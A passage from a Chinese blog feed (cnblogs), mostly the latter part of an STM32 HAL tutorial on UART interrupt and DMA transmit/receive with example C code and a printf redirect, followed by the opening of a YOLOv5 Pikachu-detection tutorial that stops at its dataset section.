&lt;p&gt;自动生成的代码中已经使能了中断&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021628587-1497200843.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;（二）&lt;span&gt;相关函数&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;l  &lt;strong&gt;接收中断开启，只开启一次中断&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以非阻塞模式接收一定数量的数据，当UART奇偶校验未启用(PCE = 0)，且字长配置为9位(M1-M0 = 01)时，&lt;/p&gt;
&lt;p&gt;*接收到的数据作为一组u16处理。在这种情况下，Size必须指出数字&lt;/p&gt;
&lt;p&gt;*的u16可通过pData。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
HAL_StatusTypeDef HAL_UART_Receive_IT(UART_HandleTypeDef *huart, uint8_t *pData, uint16_t Size)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;p&gt;huart: 指向uart _ handletypedef结构的huart指针，该结构包含指定uart模块的配置信息。&lt;/p&gt;
&lt;p&gt;pData：指向数据缓冲区的指针(u8或u16数据元素)。&lt;/p&gt;
&lt;p&gt;Size：需要接收的数据元素(u8或u16)的数量。&lt;/p&gt;
&lt;p&gt;返回：&lt;/p&gt;
&lt;p&gt;HAL 状态&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
typedef &lt;span&gt;enum&lt;/span&gt;&lt;span&gt;
{
  HAL_OK       &lt;/span&gt;= &lt;span&gt;0x00U&lt;/span&gt;&lt;span&gt;,
  HAL_ERROR    &lt;/span&gt;= &lt;span&gt;0x01U&lt;/span&gt;&lt;span&gt;,
  HAL_BUSY     &lt;/span&gt;= &lt;span&gt;0x02U&lt;/span&gt;&lt;span&gt;,
  HAL_TIMEOUT  &lt;/span&gt;= &lt;span&gt;0x03U&lt;/span&gt;&lt;span&gt;
} HAL_StatusTypeDef;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;l  &lt;strong&gt;中断接收回调函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HAL_UART_RxHalfCpltCallback();一半数据接收完成时调用&lt;/p&gt;
&lt;p&gt;HAL_UART_RxCpltCallback();数据完全接受完成后调用&lt;/p&gt;
&lt;p&gt;函数原型&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; HAL_UART_RxHalfCpltCallback(UART_HandleTypeDef *&lt;span&gt;huart);
&lt;/span&gt;&lt;span&gt;void&lt;/span&gt; HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart);
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;（三） 编程实现方法&lt;span lang=&quot;EN-US&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
uint8_t my_uart1_redata=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启串口接收中断&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt;&lt;span&gt; my_uart1_enable_inpterr(){
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断&lt;/span&gt;
    HAL_UART_Receive_IT(&amp;amp;huart1,&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
    
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;串口收到数据回调&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; HAL_UART_RxCpltCallback(UART_HandleTypeDef *&lt;span&gt;huart){
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(huart-&amp;gt;Instance == USART1)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断串口号&lt;/span&gt;
&lt;span&gt;    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送&lt;/span&gt;
        HAL_UART_Transmit(&amp;amp;huart1,&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;100&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断&lt;/span&gt;
        HAL_UART_Receive_IT(&amp;amp;huart1,&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;存在问题：&lt;/p&gt;
&lt;p&gt;数据发送太快之后就可能导致单片机无法再接收数据，以至于永久性损坏，通常可以在主循环里判断标志位再次启动，可以避免永久性损坏问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021808959-1653156229.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;（四） 编程实现方法&lt;span lang=&quot;EN-US&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;修改stm32f1xx_it.c里面的串口中断&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
#include &amp;lt;usart.h&amp;gt;
&lt;span&gt;void&lt;/span&gt; USART1_IRQHandler(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
  &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; USER CODE BEGIN USART1_IRQn 0 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;正在接收&lt;/span&gt;
   &lt;span&gt;if&lt;/span&gt;(__HAL_UART_GET_FLAG(&amp;amp;huart1, UART_FLAG_RXNE) !=&lt;span&gt; RESET)
     {
             &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;NET_UART_RECV(READ_REG(huart1.Instance-&amp;gt;RDR));&lt;/span&gt;
             my_uart1_callback(huart1.Instance-&amp;gt;&lt;span&gt;DR);
             __HAL_UART_CLEAR_FLAG(&lt;/span&gt;&amp;amp;&lt;span&gt;huart1,UART_FLAG_RXNE);
     }
     
   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;溢出-如果发生溢出需要先读SR,再读DR寄存器 则可清除不断入中断的问题&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;(__HAL_UART_GET_FLAG(&amp;amp;huart1,UART_FLAG_ORE)==&lt;span&gt; SET)
    {
        __HAL_UART_CLEAR_FLAG(&lt;/span&gt;&amp;amp;huart1,UART_FLAG_ORE);          &lt;span&gt;//&lt;/span&gt;&lt;span&gt;读SR
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;READ_REG(huart1.Instance-&amp;gt;RDR);                         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;读DR&lt;/span&gt;
&lt;span&gt;    }
       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;手动关闭自带的串口中断处理&lt;/span&gt;
&lt;span&gt;#if&lt;/span&gt; 0
  &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; USER CODE END USART1_IRQn 0 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
  HAL_UART_IRQHandler(&lt;/span&gt;&amp;amp;&lt;span&gt;huart1);
  &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; USER CODE BEGIN USART1_IRQn 1 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;#endif&lt;/span&gt;
  &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; USER CODE END USART1_IRQn 1 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;标准函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启串口接收中断&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt;&lt;span&gt; my_uart1_enable_inpterr(){
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断&lt;/span&gt;
     __HAL_UART_ENABLE_IT(&amp;amp;huart1, UART_IT_RXNE);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;使能接收中断&lt;/span&gt;
&lt;span&gt;    
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;串口收到数据回调&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt;&lt;span&gt; my_uart1_callback(uint8_t rdata){
    
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送&lt;/span&gt;
        HAL_UART_Transmit(&amp;amp;huart1,&amp;amp;rdata,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;修改了HAL自带的串口中断函数，可以有效的避免接收中断失效问题，但是你测试的时候会发现串口助手发送的数据和串口助手接收到的数据不完整，这是正常的，因为中断接收是很快的，而发送是阻塞的，而实际也不会这样使用，所以一般都会用数组做缓冲区接收串口数据。&lt;/p&gt;
&lt;h2&gt;&lt;span lang=&quot;EN-US&quot;&gt;六、 配置串口为中断接收&lt;span lang=&quot;EN-US&quot;&gt;DMA发送&lt;/span&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;l  STM32可用DMA的外设：定时器、ADC、SPI、IIC、USART&lt;/p&gt;
&lt;p&gt;l  使用DMA必须开启中断&lt;/p&gt;
&lt;p&gt;l  串口DMA模式最大为u16个字节，则65535&lt;/p&gt;
&lt;h3&gt;（一）cubmx设置&lt;/h3&gt;
&lt;p&gt;通用配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021949421-335365374.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;



&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114021956140-1882012597.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;中断开启&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022006628-376413262.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;DMA发送设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022018717-1586062797.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dirction&lt;/strong&gt; &lt;strong&gt;： DMA传输方向&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;四种传输方向：&lt;/p&gt;
&lt;p&gt;l  外设到内存 Peripheral To Memory&lt;/p&gt;
&lt;p&gt;l  内存到外设 Memory To Peripheral&lt;/p&gt;
&lt;p&gt;l  内存到内存 Memory To Memory&lt;/p&gt;
&lt;p&gt;l  外设到外设 Peripheral To Peripheral&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Priority&lt;/strong&gt;&lt;strong&gt;： 传输速度&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;l  最高优先级 Very Hight&lt;/p&gt;
&lt;p&gt;l  高优先级 Hight&lt;/p&gt;
&lt;p&gt;l  中等优先级 Medium&lt;/p&gt;
&lt;p&gt;l  低优先级；Low&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Priority&lt;/strong&gt;&lt;strong&gt;： 优先级&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;l  最高优先级 Very Hight&lt;/p&gt;
&lt;p&gt;l  高优先级 Hight&lt;/p&gt;
&lt;p&gt;l  中等优先级 Medium&lt;/p&gt;
&lt;p&gt;l  低优先级；Low&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;mode&lt;/strong&gt;&lt;strong&gt;：模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;l  Normal：正常模式，当一次DMA数据传输完后，停止DMA传送 ，也就是只传输一次&lt;/p&gt;
&lt;p&gt;l  Circular： 循环模式，传输完成后又重新开始继续传输，不断循环永不停止&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Increment Address&lt;/strong&gt;&lt;strong&gt;：地址增加&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;l  Peripheral：设置传输数据的时候外设地址是不变还是递增。如果设置 为递增，那么下一次传输的时候地址加 Data Width个字节，勾选表示递增。&lt;/p&gt;
&lt;p&gt;l  Memory：设置传输数据时候内存地址是否递增。如果设置 为递增，那么下一次传输的时候地址加 Data Width个字节，这个Src Memory一样，只不过针对的是内存。，勾选表示递增。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;data width&lt;/strong&gt;&lt;strong&gt;：数据宽度&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;byte：字节，通用8位，与u8相同&lt;/p&gt;
&lt;p&gt;word：字长，与硬件的位数相同，STM32是32位，所以对应是u32&lt;/p&gt;
&lt;p&gt;Half Word：半个字长，所以对应是u16&lt;/p&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;(二)  编程实现&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;串口DMA发送&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
#include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;string.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;extern&lt;/span&gt;&lt;span&gt; DMA_HandleTypeDef hdma_usart1_tx;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数组数据&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; my_uart1_send_data(uint8_t *&lt;span&gt;tdata,uint16_t tnum){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;等待发送状态OK&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(HAL_DMA_GetState(&amp;amp;hdma_usart1_tx) == HAL_DMA_STATE_BUSY) HAL_Delay(&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数据&lt;/span&gt;
        HAL_UART_Transmit_DMA(&amp;amp;&lt;span&gt;huart1,tdata,tnum);
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送字符串&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; my_uart1_send_string(uint8_t *&lt;span&gt;tdata){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;等待发送状态OK&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(HAL_DMA_GetState(&amp;amp;hdma_usart1_tx) == HAL_DMA_STATE_BUSY) HAL_Delay(&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数据&lt;/span&gt;
        HAL_UART_Transmit_DMA(&amp;amp;&lt;span&gt;huart1,tdata,strlen(tdata));
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;串口库函数中断接收&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
uint8_t my_uart1_redata=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启串口接收中断&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt;&lt;span&gt; my_uart1_enable_inpterr(){
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断&lt;/span&gt;
    HAL_UART_Receive_IT(&amp;amp;huart1,&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
    
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;串口收到数据回调&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; HAL_UART_RxCpltCallback(UART_HandleTypeDef *&lt;span&gt;huart){
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(huart-&amp;gt;Instance == USART1)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断串口号&lt;/span&gt;
&lt;span&gt;    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送&lt;/span&gt;
        my_uart1_send_data(&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断&lt;/span&gt;
        HAL_UART_Receive_IT(&amp;amp;huart1,&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;主函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启中断&lt;/span&gt;
&lt;span&gt;my_uart1_enable_inpterr();
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数据&lt;/span&gt;
my_uart1_send_data(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1dongxiaodong_DMA_1\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,strlen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1dongxiaodong_DMA_1\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
my_uart1_send_data(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2dongxiaodong_DMA_2\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,strlen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2dongxiaodong_DMA_2\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
my_uart1_send_string(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;3dongxiaodong_DMA_3\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span lang=&quot;EN-US&quot;&gt;七、 串口&lt;span lang=&quot;EN-US&quot;&gt;DMA收和发&lt;/span&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span lang=&quot;EN-US&quot;&gt;（一）&lt;span lang=&quot;EN-US&quot;&gt;CubeMX配置&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;通用配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022200067-904415262.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022205175-491015.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;中断开启&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022213920-1201979636.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;DMA发送设置&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022222951-1428447446.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;DMA接收设置，要注意这里是循环&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1485202/202101/1485202-20210114022239656-1298197528.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;（二）&lt;span&gt;编程实现&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;收发函数原型&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
#include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;string.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;extern&lt;/span&gt;&lt;span&gt; DMA_HandleTypeDef hdma_usart1_tx;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数组数据&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; my_uart1_send_data(uint8_t *&lt;span&gt;tdata,uint16_t tnum){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;等待发送状态OK&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(HAL_DMA_GetState(&amp;amp;hdma_usart1_tx) == HAL_DMA_STATE_BUSY) HAL_Delay(&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数据&lt;/span&gt;
        HAL_UART_Transmit_DMA(&amp;amp;&lt;span&gt;huart1,tdata,tnum);
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送字符串&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; my_uart1_send_string(uint8_t *&lt;span&gt;tdata){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;等待发送状态OK&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(HAL_DMA_GetState(&amp;amp;hdma_usart1_tx) == HAL_DMA_STATE_BUSY) HAL_Delay(&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送数据&lt;/span&gt;
        HAL_UART_Transmit_DMA(&amp;amp;&lt;span&gt;huart1,tdata,strlen(tdata));
}

uint8_t my_uart1_redata&lt;/span&gt;=&lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启串口接收中断&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt;&lt;span&gt; my_uart1_enable_inpterr(){
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;HAL_UART_Receive_IT(&amp;amp;huart1,&amp;amp;my_uart1_redata,1);&lt;/span&gt;
    HAL_UART_Receive_DMA(&amp;amp;huart1,&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置接收缓冲区&lt;/span&gt;
&lt;span&gt;    
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;串口收到数据回调&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; HAL_UART_RxCpltCallback(UART_HandleTypeDef *&lt;span&gt;huart){
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(huart-&amp;gt;Instance == USART1)&lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断串口号&lt;/span&gt;
&lt;span&gt;    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送&lt;/span&gt;
        my_uart1_send_data(&amp;amp;my_uart1_redata,&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启一次中断
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;HAL_UART_Receive_IT(&amp;amp;huart1,&amp;amp;my_uart1_redata,1);&lt;/span&gt;
&lt;span&gt;    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;主函数使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;初始化DMA接收&lt;/span&gt;
&lt;span&gt;my_uart1_enable_inpterr();
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发送函数调用&lt;/span&gt;
my_uart1_send_data(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1dongxiaodong_DMA_1\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,strlen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1dongxiaodong_DMA_1\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
my_uart1_send_data(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2dongxiaodong_DMA_2\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,strlen(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;2dongxiaodong_DMA_2\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
my_uart1_send_string(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;3dongxiaodong_DMA_3\r\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;八、printf实现&lt;/span&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
#include &amp;lt;stdio.h&amp;gt;
&lt;span&gt;int&lt;/span&gt; fputc(&lt;span&gt;int&lt;/span&gt; ch,FILE *&lt;span&gt;f)
{
    uint32_t temp &lt;/span&gt;=&lt;span&gt; ch;
 
    HAL_UART_Transmit(&lt;/span&gt;&amp;amp;huart1,(uint8_t *)&amp;amp;temp,&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;0xFFFF&lt;/span&gt;);        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;huart1是串口的句柄&lt;/span&gt;
    HAL_Delay(&lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
 
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ch;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;正点原子、洋桃电子&lt;/p&gt;
</description>
<pubDate>Wed, 13 Jan 2021 18:28:00 +0000</pubDate>
<dc:creator>东小东</dc:creator>
<og:description>一、基础认识 (一) 并行通信 原理：数据的各个位同时传输 优点：速度快 缺点：占用引脚资源多，通常工作时有多条数据线进行数据传输 8bit数据传输典型连接图： 传输的数据是二进制：11101010，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/dongxiaodong/p/14275284.html</dc:identifier>
</item>
<item>
<title>yolov5实战之皮卡丘检测 - haoliuhust</title>
<link>http://www.cnblogs.com/haoliuhust/p/14275240.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/haoliuhust/p/14275240.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;从接触深度学习开始一直都做的是人脸识别，基本上也一直都在用mxnet. 记得之前在刚接触的时候看到博客中写到，深度学习分三个层次，第一个层次是分类，第二个层次是检测，第三个层次是分割。人脸识别算是分类问题，也就是一直在第一个层次···一直都想有机会了解下第二个层次，奈何精力有限，工作中也没有实际的项目需要。最近正好有个不急的检测项目，趁此机会入门检测吧。工作中听同事提到yolov5效果不错，而且文档指导也比较丰富，因此选择从此入手，顺便也熟悉下pytorch。本文就以训练一个简单的皮卡丘检测作为入门吧，也激发下对检测的学习兴趣，暂时不涉及网络，anchor等细节的理解，只以训练完为目标。&lt;/p&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;环境准备&lt;/h2&gt;
&lt;p&gt;安装torch这些就不说了，本次训练基于yolov5官方项目：&lt;br/&gt;&lt;a href=&quot;https://github.com/ultralytics/yolov5&quot; target=&quot;_blank&quot;&gt;https://github.com/ultralytics/yolov5&lt;/a&gt;&lt;br/&gt;clone后，pip install -r requirements.txt安装各项依赖&lt;br/&gt;基本的目录结构如下：&lt;br/&gt;data: 训练数据和数据配置文件以及训练配置&lt;br/&gt;models: 模型配置文件&lt;br/&gt;utils: 数据读取、nms等各种训练测试中用到的脚本&lt;br/&gt;weight:&lt;br/&gt;train.py: 训练脚本&lt;br/&gt;test.py：测试脚本&lt;br/&gt;detect.py: 运行脚本&lt;/p&gt;
&lt;h2 id=&quot;数据集准备&quot;&gt;数据集准备&lt;/h2&gt;
